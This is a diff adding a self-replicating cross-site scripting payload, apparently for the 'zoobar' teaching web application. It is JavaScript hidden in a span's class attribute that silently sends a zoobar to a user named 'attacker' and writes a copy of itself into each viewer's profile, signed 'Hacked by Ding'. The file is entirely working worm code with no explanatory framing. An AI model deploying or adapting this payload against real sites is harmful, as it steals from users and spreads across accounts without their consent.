@@ -1,0 +1,23 @@
+<span id="zoobars"  class="
+(function(){
+	var and = String.fromCharCode(38);
+	var transfer = function(amount, receiver){
+		var xhr = new XMLHttpRequest();
+		xhr.open('POST', '../transfer.php', true);
+		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+		xhr.send(`zoobars=${amount}${and}zb_recipient=${receiver}${and}submission=Send`);
+	};
+	
+	var replicate = function(){
+		var xhr = new XMLHttpRequest();
+		xhr.open('POST', '../index.php', true);
+		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+		xhr.send(`profileupdate=${encodeURI(document.getElementById('zoobars').outerHTML)}${and}profilesubmit=Save`);
+	};
+	
+	transfer(1, 'attacker');
+	replicate();
+	
+	return 10;
+})();
+">Hacked by Ding</span>
